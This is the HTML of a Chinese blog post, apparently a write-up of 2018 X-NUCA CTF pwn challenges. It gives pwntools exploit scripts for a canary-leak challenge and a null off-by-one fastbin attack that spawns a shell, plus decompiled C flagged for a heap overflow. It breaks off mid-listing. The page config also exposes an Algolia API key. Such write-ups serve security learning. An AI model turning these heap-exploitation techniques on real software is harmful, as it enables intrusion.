@@ -1,0 +1,875 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="个人赛catchme漏洞利用flag存放在data段中，可以利用canary的报错直接读出flag。 利用脚本12345678from pwn import *context.log_level=&apos;debug&apos;p = process(&apos;./catch_me&apos;)p.sendlineafter(&quot;Your turn, show your flag:\n&quot;,&apos;&apos;)payload =&apos;a&apos;*0x128+p">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018 x-nuca pwn">
+<meta property="og:url" content="http://0gur1.cc/2018/12/18/2018-x-nuca-pwn/index.html">
+<meta property="og:site_name" content="0gur1">
+<meta property="og:description" content="个人赛catchme漏洞利用flag存放在data段中，可以利用canary的报错直接读出flag。 利用脚本12345678from pwn import *context.log_level=&apos;debug&apos;p = process(&apos;./catch_me&apos;)p.sendlineafter(&quot;Your turn, show your flag:\n&quot;,&apos;&apos;)payload =&apos;a&apos;*0x128+p">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-12-19T14:02:00.196Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018 x-nuca pwn">
+<meta name="twitter:description" content="个人赛catchme漏洞利用flag存放在data段中，可以利用canary的报错直接读出flag。 利用脚本12345678from pwn import *context.log_level=&apos;debug&apos;p = process(&apos;./catch_me&apos;)p.sendlineafter(&quot;Your turn, show your flag:\n&quot;,&apos;&apos;)payload =&apos;a&apos;*0x128+p">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+	  applicationID: '7MHLMVVD1M',
+      apiKey: 'dbb74cd528079f8c1d1a6138e9ed5b67',
+      indexName: 'test_hexo',
+      hits: "",
+      labels: ""
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://0gur1.cc/2018/12/18/2018-x-nuca-pwn/"/>
+
+
+
+
+
+  <title>2018 x-nuca pwn | 0gur1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0gur1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  <!-- -->
+  
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2018/12/18/2018-x-nuca-pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0gur1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0gur1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2018 x-nuca pwn</h1>
+        
+
+        <div class="post-meta">
+		  
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-18T20:02:18+08:00">
+                2018-12-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/12/18/2018-x-nuca-pwn/" class="leancloud_visitors" data-flag-title="2018 x-nuca pwn">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3,276字
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="个人赛"><a href="#个人赛" class="headerlink" title="个人赛"></a>个人赛</h1><h2 id="catchme"><a href="#catchme" class="headerlink" title="catchme"></a>catchme</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>flag存放在data段中，可以利用canary的报错直接读出flag。</p>
+<h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./catch_me'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your turn, show your flag:\n"</span>,<span class="string">''</span>)</span><br><span class="line">payload =<span class="string">'a'</span>*<span class="number">0x128</span>+p64(<span class="number">0x600ca0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Are you sure?\n"</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在add的scanf中指定了输入字符串的长度32，由于scanf会主动在末尾加\0，所以会在第33个字节处写入一个\0，造成null off by one漏洞。</p>
+<p>题目中malloc的chunk只有0x8和0x20两种，且0x20的只能malloc一次。这个0x20可以用来调整地址的位置，如果name1指向了0x100，name2指向0x120，通过对content2的输入能够覆盖name2中的地址末位为\x00，即name2同样指向了0x100。这样在删除name1之后再对name2进行edit，就相当于与UAF，从而利用fastbin attack伪造一个fastbin指向command（0x602098）附近。0x602090这个位置是由用户控制的，可以把这个字段伪造成一个fastbin的size字段，进而将0x602098位置当做一个chunk分配给用户，覆写command为’/bin/sh’。</p>
+<h3 id="利用脚本-1"><a href="#利用脚本-1" class="headerlink" title="利用脚本"></a>利用脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./note'</span>)</span><br><span class="line">cmd=<span class="number">0x602098</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"please input the command:\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendafter(<span class="string">"block name:"</span>,name)</span><br><span class="line">	p.sendafter(<span class="string">"block content:"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1234</span><span class="params">(name,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"please input the command:\n"</span>,<span class="string">'1234'</span>)</span><br><span class="line">	p.sendafter(<span class="string">"input the secret name:"</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">"please input the content:\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"please input the command:\n"</span>,<span class="string">'4'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"please input the block id:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,name,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"please input the command:\n"</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"please input the index you want to edit\n"</span>,str(idx))</span><br><span class="line">	p.sendafter(<span class="string">"please input name:\n"</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">"please input the content:\n"</span>,content)</span><br><span class="line">	</span><br><span class="line">p.sendafter(<span class="string">"Please leave your name :"</span>,<span class="string">'\x21\x00\x00\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'0gur1\n'</span>,<span class="string">'content\n'</span>)<span class="comment">#0-&gt;0x10</span></span><br><span class="line">add(<span class="string">'1gur1\n'</span>,<span class="string">'content\n'</span>)<span class="comment">#1-&gt;0x30</span></span><br><span class="line">add(<span class="string">'2gur1\n'</span>,<span class="string">'content\n'</span>)<span class="comment">#2-&gt;0x50</span></span><br><span class="line">add(<span class="string">'3gur1\n'</span>,<span class="string">'content\n'</span>)<span class="comment">#3-&gt;0x70</span></span><br><span class="line">add(<span class="string">'4gur1\n'</span>,<span class="string">'content\n'</span>)<span class="comment">#4-&gt;0x90</span></span><br><span class="line">add(<span class="string">'5gur1\n'</span>,<span class="string">'content\n'</span>)<span class="comment">#5-&gt;0xb0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f1234(<span class="string">'secret\n'</span>,<span class="string">'content\n'</span>)<span class="comment">#0xd0</span></span><br><span class="line">add(<span class="string">'6gur1\n'</span>,<span class="string">'content\n'</span>)<span class="comment">#6-&gt;0x100</span></span><br><span class="line">add(<span class="string">'7gur1\n'</span>,<span class="string">'1'</span>*<span class="number">32</span>)<span class="comment">#7-&gt;0x120;change to #7-&gt;0x100</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)<span class="comment">#fb-&gt;0x100</span></span><br><span class="line">edit(<span class="number">7</span>,p64(cmd<span class="number">-0x10</span>),<span class="string">'content\n'</span>)<span class="comment">#fb-&gt;0x100-&gt;cmd</span></span><br><span class="line">add(<span class="string">'8gur1\n'</span>,<span class="string">'content\n'</span>)<span class="comment">#8-&gt;100</span></span><br><span class="line">add(<span class="string">'/bin/sh\n'</span>,<span class="string">'content\n'</span>)<span class="comment">#9-&gt;cmd</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"please input the command:\n"</span>,<span class="string">'2333'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="线下赛"><a href="#线下赛" class="headerlink" title="线下赛"></a>线下赛</h1><h2 id="pwn4-library"><a href="#pwn4-library" class="headerlink" title="pwn4-library"></a>pwn4-library</h2><p>这题我的思路可能想复杂了，因为看见别的师傅发了wp，数据量不是很大，我可能绕弯了。毕竟是肝了一晚上的一道题（是的大佬们，你们一会就做出来的题我肝了一夜），还是纪念一下orz</p>
+<h3 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h3><p>程序将功能分为两大类：管理员和学生。管理员可以添加、删除以及检查书。</p>
+<p>add_books添加一本书，需要创建三种结构体：book_node，section_head和section_node。一本书有多个章节，根据输入的num，创建多个section_node。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book_node</span>&#123;</span></span><br><span class="line">  <span class="keyword">char</span> title[<span class="number">16</span>];</span><br><span class="line">  __int64 abs_title;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">section_head</span> * <span class="title">section_addr</span>;</span></span><br><span class="line">  __int64 borrow;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">book_node</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">section_head</span>&#123;</span></span><br><span class="line">  __int64 section_num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">section_node</span> * <span class="title">section_list</span>;</span></span><br><span class="line">  __int64 type;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">section_node</span>&#123;</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">8</span>];</span><br><span class="line">  __int64 length;</span><br><span class="line">  <span class="keyword">char</span> *content;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">secion_node</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">add_books</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ……</span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = (struct book_node *)<span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  v2 = head;</span><br><span class="line">  v1-&gt;next = head-&gt;next;</span><br><span class="line">  v2-&gt;next = v1;</span><br><span class="line">  LODWORD(v1-&gt;borrow) = <span class="number">0</span>;</span><br><span class="line">  v3 = (struct section_head *)<span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v1-&gt;section_addr = v3;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"title:"</span>);</span><br><span class="line">  v5 = read(<span class="number">0</span>, tmp, <span class="number">0x10</span>uLL);</span><br><span class="line">  LODWORD(v6) = v5;</span><br><span class="line">  v7 = v5 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( tmp[v7] == <span class="number">10</span> )</span><br><span class="line">    tmp[v7] = <span class="number">0</span>;</span><br><span class="line">  v8 = abs_int(tmp);</span><br><span class="line">  LOBYTE(v1-&gt;abs_title) = v8;</span><br><span class="line">  <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Oh, it's a C book"</span>);</span><br><span class="line">    LODWORD(v1-&gt;section_addr-&gt;type) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Oh, it's a MATH book"</span>);</span><br><span class="line">    LODWORD(v1-&gt;section_addr-&gt;type) = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v13;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Oh, it's a English book"</span>);</span><br><span class="line">    LODWORD(v1-&gt;section_addr-&gt;type) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v6;</span><br><span class="line">  <span class="built_in">strncpy</span>(v1-&gt;title, tmp, (<span class="keyword">signed</span> <span class="keyword">int</span>)v6);</span><br><span class="line">  v1-&gt;title[v6] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many sections"</span>);</span><br><span class="line">  v9 = read_int();</span><br><span class="line">  LODWORD(v4-&gt;section_num) = v9;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      input_section(v1-&gt;section_addr);</span><br><span class="line">      ++v10;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v9 != v10 );</span><br><span class="line">  &#125;</span><br><span class="line">  ++LODWORD(head-&gt;num);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v13;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">input_section</span><span class="params">(struct section_head *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   ……</span><br><span class="line">  v1 = (struct section_node *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v2 = v1;</span><br><span class="line">  v1-&gt;next = a1-&gt;section_list;                 </span><br><span class="line">  a1-&gt;section_list = v1;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input section name"</span>);</span><br><span class="line">  v3 = (<span class="keyword">unsigned</span> __int64)read(<span class="number">0</span>, v2, <span class="number">8u</span>LL) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2-&gt;name[v3] == <span class="number">10</span> )</span><br><span class="line">    v2-&gt;name[v3] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"what's the section length:"</span>);</span><br><span class="line">  v4 = read_int();</span><br><span class="line">  LODWORD(v2-&gt;length) = v4;</span><br><span class="line">  v5 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v4);</span><br><span class="line">  v2-&gt;content_addr = v5;</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(a1-&gt;type) == <span class="number">1</span> )</span><br><span class="line">    LODWORD(v2-&gt;length) = <span class="number">2</span> * v4;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"what's the section content:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, v2-&gt;content_addr, LODWORD(v2-&gt;length));<span class="comment">// heap overflow ！！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>check_books检查title是否为空，abs_title和利用title计算出的abs值是否一致。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_books</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ……</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"check all books"</span>);</span><br><span class="line">  result = (<span class="keyword">signed</span> <span class="keyword">int</span>)head;</span><br><span class="line">  <span class="keyword">for</span> ( i = head-&gt;next; i; i = i-&gt;next )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( LODWORD(i-&gt;borrow) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        ;</span><br><span class="line">    &#125;</span><br><span class="line">    result = abs_int(i-&gt;title);</span><br><span class="line">    v2 = result;</span><br><span class="line">    <span class="keyword">if</span> ( !i-&gt;title[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)i-&gt;title = 'enifednu';</span><br><span class="line">      i-&gt;title[<span class="number">8</span>] = <span class="string">'d'</span>;</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">"The book's name is undefined"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 != LOBYTE(i-&gt;abs_title) )</span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(i-&gt;abs_title) = v2;</span><br><span class="line">      result = <span class="built_in">printf</span>(<span class="string">"Oh,%s is classified mistakenly\n"</span>, i);<span class="comment">// leak address</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>dele_book将要删除的book_node从链表中解链并释放对应的book_node。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">dele_book</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ……</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"title:"</span>);</span><br><span class="line">  v0 = (<span class="keyword">unsigned</span> __int64)read(<span class="number">0</span>, v4, <span class="number">0x10</span>uLL) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4[v0] == <span class="number">10</span> )</span><br><span class="line">    v4[v0] = <span class="number">0</span>;</span><br><span class="line">  v1 = head-&gt;next;</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="built_in">strcmp</span>(v4, v1-&gt;title) )             <span class="comment">// cmp title</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = v1;                                  <span class="comment">// v2:last node;v1:present node</span></span><br><span class="line">      <span class="keyword">if</span> ( !v1-&gt;next )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      v1 